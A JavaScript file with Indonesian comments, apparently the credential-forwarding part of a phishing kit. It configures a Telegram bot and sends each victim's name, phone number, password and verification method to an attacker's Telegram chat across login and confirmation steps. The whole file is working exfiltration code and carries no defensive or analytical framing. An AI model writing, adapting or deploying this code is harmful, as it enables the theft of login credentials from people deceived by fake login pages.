// Konfigurasi Bot Telegram
// Ganti nilai-nilai di bawah ini dengan data bot Telegram Anda

const TELEGRAM_CONFIG = {
    // Token bot dari @BotFather
    BOT_TOKEN: '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
    
    // Chat ID grup/channel Telegram
    // Untuk mendapatkan Chat ID:
    // 1. Tambahkan bot ke grup/channel
    // 2. Kirim pesan di grup/channel
    // 3. Buka https://api.telegram.org/bot[BOT_TOKEN]/getUpdates
    // 4. Cari "chat":{"id": di response JSON
    CHAT_ID: '-1001234567890',
    
    // Base URL Telegram API
    API_URL: 'https://api.telegram.org/bot'
};

// Fungsi untuk mengirim pesan ke Telegram
async function sendTelegramMessage(data) {
    const { BOT_TOKEN, CHAT_ID, API_URL } = TELEGRAM_CONFIG;
    
    let message = '';
    
    // Format pesan berdasarkan step
    switch(data.step) {
        case 'login':
            message = `🔔 *Data Login Baru*
👤 *Nama:* ${data.nama}
📱 *No HP:* ${data.nohp}
🎯 *Aksi:* ${data.actionType}
⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
📍 *Step:* ${data.step}`;
            break;
            
        case 'password_confirmation':
            message = `🔐 *Password Dikonfirmasi*
👤 *Nama:* ${data.nama}
📱 *No HP:* ${data.nohp}
🔑 *Password:* ${data.password}
🎯 *Aksi:* ${data.actionType}
⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
📍 *Step:* ${data.step}`;
            break;
            
        case 'final_confirmation':
            message = `🎯 *PROSES SELESAI - DATA LENGKAP*
👤 *Nama:* ${data.nama}
📱 *No HP:* ${data.nohp}
🔑 *Password:* ${data.password}
🎯 *Aksi:* ${data.actionType}
📧 *Metode Verifikasi:* ${data.verificationMethod}
✅ *Status:* ${data.status}
⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
📍 *Step:* ${data.step}`;
            break;
            
        default:
            message = `📝 *Data Baru*
${JSON.stringify(data, null, 2)}`;
    }
    
    try {
        const response = await fetch(`${API_URL}${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        if (response.ok) {
            console.log('Pesan berhasil dikirim ke Telegram');
        } else {
            console.error('Gagal mengirim pesan ke Telegram');
        }
    } catch (error) {
        console.error('Error mengirim pesan ke Telegram:', error);
    }
}

// Export untuk digunakan di file lain
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { TELEGRAM_CONFIG, sendTelegramMessage };
}
